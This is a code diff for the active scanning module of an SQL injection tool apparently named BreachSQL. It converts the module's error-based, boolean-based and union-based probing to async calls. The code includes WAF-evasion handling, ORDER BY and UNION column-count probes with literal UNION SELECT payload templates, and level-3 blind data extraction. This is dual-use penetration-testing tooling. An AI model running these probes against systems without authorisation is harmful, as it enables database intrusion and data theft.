@@ -18,7 +18,7 @@ from typing import Any, Dict, List, Optional, Tuple
 
 from ...log import get_logger
 from ...reporter import ErrorBasedFinding, BooleanFinding, UnionFinding, ExtractionFinding, ScanResult
-from ...http.injector import Injector
+from ...http.injector import AsyncInjector
 from ...http.waf_detect import EVASION_NONE
 from ..options import ScanOptions
 from ..payloads import (
@@ -34,6 +34,7 @@ from ..payloads import (
 )
 from ._helpers import (
     _fetch,
+    _async_fetch,
     _diff_score,
     _len_ratio,
     _has_stable_boolean_signal,
@@ -52,11 +53,11 @@ logger = get_logger("breachsql.active")
 # Public entry point
 # ---------------------------------------------------------------------------
 
-def scan_param(
+async def scan_param(
     surface: Dict[str, Any],
     evasions: List[str],
     opts: ScanOptions,
-    injector: Injector,
+    injector: AsyncInjector,
     result: ScanResult,
 ) -> None:
     """
@@ -71,10 +72,8 @@ def scan_param(
     path_index = surface.get("path_index", 0)
     second_url = getattr(opts, "second_url", "")
 
-    # Fetch a clean baseline using the original param value (not empty string),
-    # so the baseline represents normal application behaviour for a valid input.
-    baseline = _fetch(injector, url, method, params, param, None,
-                      second_url=second_url, json_body=json_body, path_index=path_index)
+    baseline = await _async_fetch(injector, url, method, params, param, None,
+                                  second_url=second_url, json_body=json_body, path_index=path_index)
     if baseline is None:
         return
 
@@ -85,31 +84,26 @@ def scan_param(
     for evasion in (evasions if evasions else [EVASION_NONE]):
         if opts.use_error and not _surface_error_found:
             _before = len(result.error_based)
-            _test_error_based(url, method, params, param, evasion, opts, injector, result,
-                              second_url, json_body, path_index)
+            await _test_error_based(url, method, params, param, evasion, opts, injector, result,
+                                    second_url, json_body, path_index)
             _surface_error_found = len(result.error_based) > _before
 
-        # Skip boolean if error or union already gave a definitive confirmation —
-        # both are cheaper to detect and leave no ambiguity about injectability.
         _definitive_hit = _surface_error_found or _surface_union_found
         if opts.use_boolean and not _definitive_hit and not _surface_boolean_found:
             _before = len(result.boolean_based)
-            _test_boolean(url, method, params, param, baseline, evasion, opts, injector, result,
-                          second_url, json_body, path_index)
+            await _test_boolean(url, method, params, param, baseline, evasion, opts, injector, result,
+                                second_url, json_body, path_index)
             _surface_boolean_found = len(result.boolean_based) > _before
 
         if opts.use_union and not _surface_union_found:
             _before = len(result.union_based)
-            _test_union(url, method, params, param, evasion, opts, injector, result,
-                        second_url, json_body, path_index)
+            await _test_union(url, method, params, param, evasion, opts, injector, result,
+                              second_url, json_body, path_index)
             _surface_union_found = len(result.union_based) > _before
 
-        # Stop escalating evasions as soon as any technique confirms injection.
-        # Once injectable under one evasion, further WAF-bypass attempts are wasted.
         if _surface_error_found or _surface_boolean_found or _surface_union_found:
             break
 
-    # Level 3: run extended payload sets (db_contents + enum) via error channel
     if opts.level >= 3 and opts.use_error:
         evasion = evasions[0] if evasions else EVASION_NONE
         _dbms = result.dbms_detected or opts.dbms
@@ -122,8 +116,8 @@ def scan_param(
         )
         for raw_payload in _extended:
             payload = apply_evasion(raw_payload, evasion)
-            resp = _fetch(injector, url, method, params, param, payload,
-                          second_url=second_url, json_body=json_body, path_index=path_index)
+            resp = await _async_fetch(injector, url, method, params, param, payload,
+                                      second_url=second_url, json_body=json_body, path_index=path_index)
             if resp is None:
                 continue
             _resp_l3 = resp
@@ -148,7 +142,6 @@ def _detect_db_error(body: str) -> Tuple[str, str]:
     """
     body = strip_status_sentinel(body)
     body_lower = body.lower()
-    # Check specific DBMSes first, then generic
     for dbms in ("mysql", "mariadb", "mssql", "postgres", "sqlite", "oracle", "generic"):
         for pattern in DB_ERROR_PATTERNS[dbms]:
             m = re.search(pattern, body_lower)
@@ -159,23 +152,20 @@ def _detect_db_error(body: str) -> Tuple[str, str]:
     return "", ""
 
 
-def _test_error_based(
+async def _test_error_based(
     url: str, method: str, params: Dict[str, str], param: str,
-    evasion: str, opts: ScanOptions, injector: Injector, result: ScanResult,
+    evasion: str, opts: ScanOptions, injector: AsyncInjector, result: ScanResult,
     second_url: str = "", json_body: bool = False, path_index: int = 0,
 ) -> None:
     payloads = get_error_payloads(opts.dbms, opts.risk, opts.level)
 
     for raw_payload in payloads:
         payload = apply_evasion(raw_payload, evasion)
-        resp = _fetch(injector, url, method, params, param, payload,
-                      second_url=second_url, json_body=json_body, path_index=path_index)
+        resp = await _async_fetch(injector, url, method, params, param, payload,
+                                  second_url=second_url, json_body=json_body, path_index=path_index)
         if resp is None:
             continue
 
-        # Strip the injected payload from the response before checking for DB
-        # errors.  Apps that reflect the payload in their own error message
-        # (e.g. "Invalid symbol: ' AND EXTRACTVALUE(...)")
         _resp_clean = resp
         for _v in (payload, payload.upper(), payload.lower()):
             _resp_clean = _resp_clean.replace(_v, "")
@@ -193,10 +183,8 @@ def _test_error_based(
                 dbms=dbms,
                 evidence=evidence,
             ))
-            # Auto-detect DBMS for the rest of the scan
             if result.dbms_detected is None and dbms != "generic":
                 result.dbms_detected = dbms
-            # One confirmed finding per param is enough
             return
 
 
@@ -204,9 +192,9 @@ def _test_error_based(
 # Boolean-based detection
 # ---------------------------------------------------------------------------
 
-def _test_boolean(
+async def _test_boolean(
     url: str, method: str, params: Dict[str, str], param: str,
-    baseline: str, evasion: str, opts: ScanOptions, injector: Injector, result: ScanResult,
+    baseline: str, evasion: str, opts: ScanOptions, injector: AsyncInjector, result: ScanResult,
     second_url: str = "", json_body: bool = False, path_index: int = 0,
 ) -> None:
     pairs = get_boolean_pairs(opts.risk, opts.level)
@@ -215,22 +203,19 @@ def _test_boolean(
         pt = apply_evasion(raw_true,  evasion)
         pf = apply_evasion(raw_false, evasion)
 
-        resp_true  = _fetch(injector, url, method, params, param, pt,
-                            second_url=second_url, json_body=json_body, path_index=path_index)
-        resp_false = _fetch(injector, url, method, params, param, pf,
-                            second_url=second_url, json_body=json_body, path_index=path_index)
+        resp_true  = await _async_fetch(injector, url, method, params, param, pt,
+                                        second_url=second_url, json_body=json_body, path_index=path_index)
+        resp_false = await _async_fetch(injector, url, method, params, param, pf,
+                                        second_url=second_url, json_body=json_body, path_index=path_index)
         if resp_true is None or resp_false is None:
             continue
 
         score = _diff_score(resp_true, resp_false)
         baseline_score = _diff_score(baseline, resp_true)
 
-        # Also check content-length divergence — catches tiny textual diffs
         len_ratio = _len_ratio(resp_true, resp_false)
         baseline_len_ratio = _len_ratio(baseline, resp_true)
 
-        # Stable-baseline boolean signal: true response matches baseline
-        # while false response diverges — catches single-line blind SQLi
         has_stable_signal = _has_stable_boolean_signal(baseline, resp_true, resp_false)
 
         stable_baseline = baseline_score <= _BOOL_LIKELY_THRESHOLD and baseline_len_ratio <= _BOOL_LEN_RATIO_THRESHOLD
@@ -242,7 +227,6 @@ def _test_boolean(
                         or (stable_baseline and len_ratio >= _BOOL_LEN_RATIO_THRESHOLD * 2)
                         or has_stable_signal)
 
-        # Ignore if true response is also different from baseline (unstable target)
         if not stable_baseline and not has_stable_signal and not is_likely:
             continue
 
@@ -262,7 +246,6 @@ def _test_boolean(
                 confirmed=confirmed,
                 evidence=strip_status_sentinel(resp_true)[:200],
             ))
-            # Level 3: attempt data extraction via binary-search char extractor
             if opts.level >= 3 and confirmed:
                 from ..extract import extract_value, get_extraction_targets
                 _dbms = getattr(opts, "dbms", "auto")
@@ -270,7 +253,7 @@ def _test_boolean(
                              "single_param": param,
                              "json_body": json_body, "path_index": path_index}
                 for _label, _expr in get_extraction_targets(_dbms):
-                    _extracted = extract_value(
+                    _extracted = await extract_value(
                         expr=_expr,
                         surface=_surface,
                         evasions=[evasion],
@@ -286,47 +269,42 @@ def _test_boolean(
                             url=url, parameter=param, method=method,
                             expr=_expr, value=_extracted, mode="boolean",
                         ))
-            return  # one finding per param
+            return
 
 
 # ---------------------------------------------------------------------------
 # Union-based detection
 # ---------------------------------------------------------------------------
 
-def _test_union(
+async def _test_union(
     url: str, method: str, params: Dict[str, str], param: str,
-    evasion: str, opts: ScanOptions, injector: Injector, result: ScanResult,
+    evasion: str, opts: ScanOptions, injector: AsyncInjector, result: ScanResult,
     second_url: str = "", json_body: bool = False, path_index: int = 0,
 ) -> None:
-    # Step 1: find column count via ORDER BY
     max_cols = getattr(opts, "max_union_cols", 20)
-    col_count = _find_column_count(url, method, params, param, evasion, injector,
-                                   second_url, max_cols, json_body, path_index)
+    col_count = await _find_column_count(url, method, params, param, evasion, injector,
+                                         second_url, max_cols, json_body, path_index)
     if col_count is None:
         return
 
-    # Step 2: find a reflected column
     marker = make_marker()
     _lite = (evasion == EVASION_NONE or evasion == "none")
     probes = union_null_probes(col_count, marker, lite=_lite)
 
-    _first_http500_payload: Optional[str] = None  # best candidate for HTTP-500 signal
+    _first_http500_payload: Optional[str] = None
 
     for raw_payload in probes:
         payload = apply_evasion(raw_payload, evasion)
-        resp = _fetch(injector, url, method, params, param, payload,
-                      second_url=second_url, json_body=json_body, path_index=path_index)
+        resp = await _async_fetch(injector, url, method, params, param, payload,
+                                  second_url=second_url, json_body=json_body, path_index=path_index)
         if resp is None:
             continue
 
-        # Case-insensitive check: servers may uppercase the injected value (e.g. .upper() calls)
         _resp_lower   = resp.lower()
         _marker_lower = marker.lower()
         if _marker_lower in _resp_lower:
-            # Resolve the actual case form as it appears in the response
             _idx = _resp_lower.index(_marker_lower)
             found_marker = resp[_idx : _idx + len(marker)]
-            # Guard 1: DB error reflection
             err_dbms, _ = _detect_db_error(resp)
             if err_dbms:
                 logger.debug(
@@ -335,7 +313,6 @@ def _test_union(
                     param, payload,
                 )
                 continue
-            # Guard 2: URL/path reflection
             if _is_path_reflected(resp, found_marker, payload):
                 logger.debug(
                     "Union probe: marker found but appears to be URL/path reflection, "
@@ -359,13 +336,9 @@ def _test_union(
             ))
             return
 
-        # HTTP 500 from a UNION probe means the injection was executed but a
-        # downstream template or type-cast crashed on the injected value.
-        # Track the first such probe; report it only if no direct reflection is found.
         if "__HTTP_STATUS_500__" in resp and _first_http500_payload is None:
             _first_http500_payload = payload
 
-    # No direct marker reflection found — fall back to HTTP-500 confirmation
     if _first_http500_payload is not None:
         _disp = re.sub(r"BreachSQL_[A-Za-z0-9]+", "<marker>", _first_http500_payload, flags=re.IGNORECASE)
         logger.finding(
@@ -382,35 +355,23 @@ def _test_union(
         ))
 
 
-def _find_column_count(
+async def _find_column_count(
     url: str, method: str, params: Dict[str, str], param: str,
-    evasion: str, injector: Injector, second_url: str = "",
+    evasion: str, injector: AsyncInjector, second_url: str = "",
     max_cols: int = 20, json_body: bool = False, path_index: int = 0,
 ) -> Optional[int]:
-    """Determine column count using ORDER BY N probes.
-
-    Probes are generated in pairs (two comment styles per N).  We track the
-    last N that did NOT produce a DB error or empty/changed response.  As soon
-    as a probe causes the page to lose its normal content (error OR blank
-    result), we know N exceeds the real column count.
-
-    DVWA-style apps return an empty body (no data rows) rather than a DB error
-    when ORDER BY N exceeds the column count, so we detect both cases.
-    """
+    """Determine column count using ORDER BY N probes."""
     import re as _re
     _lite = (evasion == EVASION_NONE or evasion == "none")
     probes = order_by_probes(max_cols=max_cols, lite=_lite)
     last_ok: Optional[int] = None
 
-    # Fetch a 'known-good' baseline to detect content disappearance
-    baseline_resp = _fetch(injector, url, method, params, param, None,
-                           second_url=second_url, json_body=json_body, path_index=path_index)
+    baseline_resp = await _async_fetch(injector, url, method, params, param, None,
+                                       second_url=second_url, json_body=json_body, path_index=path_index)
     baseline_words: set = set()
     if baseline_resp:
         baseline_words = set(w for w in baseline_resp.split() if len(w) > 4)
 
-    # Per-prefix first-seen response — used as reference when the payload changes
-    # the injection context
     prefix_baseline: Dict[str, str] = {}
 
     def _get_prefix(payload: str) -> str:
@@ -443,8 +404,8 @@ def _find_column_count(
             continue
 
         payload = apply_evasion(raw_payload, evasion)
-        resp = _fetch(injector, url, method, params, param, payload,
-                      second_url=second_url, json_body=json_body, path_index=path_index)
+        resp = await _async_fetch(injector, url, method, params, param, payload,
+                                  second_url=second_url, json_body=json_body, path_index=path_index)
         if resp is None:
             continue
 
@@ -462,8 +423,6 @@ def _find_column_count(
             if p_last is not None and n > p_last:
                 prefix_overflow.add(prefix)
 
-        # Early exit: once we have overflow confirmation for all seen prefixes
-        # that have at least one OK probe, we have enough information.
         if prefix_overflow and all(
             p in prefix_overflow
             for p in prefix_baseline
@@ -478,12 +437,8 @@ def _find_column_count(
         if best is not None:
             return best
 
-    # Fallback: ORDER BY detection failed because the app swallows DB errors
-    # (try/except around the query).  Use UNION probes instead: when the column
-    # count is correct the SQL is valid and the row is returned.
     if (last_ok is None or last_ok == max_cols) and baseline_resp is not None:
-        _fb_marker = "BSCNT_PROBE"  # short, all-caps survives .upper() on the server
-        # Two injection styles cover the common quoting contexts; exit on first hit.
+        _fb_marker = "BSCNT_PROBE"
         _fb_fmts = (
             f"' UNION SELECT {{}}-- -",
             f" UNION SELECT {{}}-- -",
@@ -493,16 +448,13 @@ def _find_column_count(
             _inner = ",".join([f"'{_fb_marker}'"] * _n)
             for _fmt in _fb_fmts:
                 _pl   = apply_evasion(_fmt.format(_inner), evasion)
-                _resp = _fetch(injector, url, method, params, param, _pl,
-                               second_url=second_url, json_body=json_body,
-                               path_index=path_index)
+                _resp = await _async_fetch(injector, url, method, params, param, _pl,
+                                           second_url=second_url, json_body=json_body,
+                                           path_index=path_index)
                 if _resp is None:
                     continue
-                # Direct reflection: marker appears in rendered text
                 if _fb_marker.lower() in _resp.lower():
                     return _n
-                # Template crash: UNION was syntactically valid but a float-format
-                # Jinja filter blew up on a NULL/string value — still a hit.
                 if "__HTTP_STATUS_500__" in _resp:
                     return _n
 
@@ -511,8 +463,9 @@ def _find_column_count(
 
 __all__ = [
     "scan_param",
-    # helpers
+    # helpers (still exported for backward compat / test patching)
     "_fetch",
+    "_async_fetch",
     "_diff_score",
     "_len_ratio",
     "_has_stable_boolean_signal",
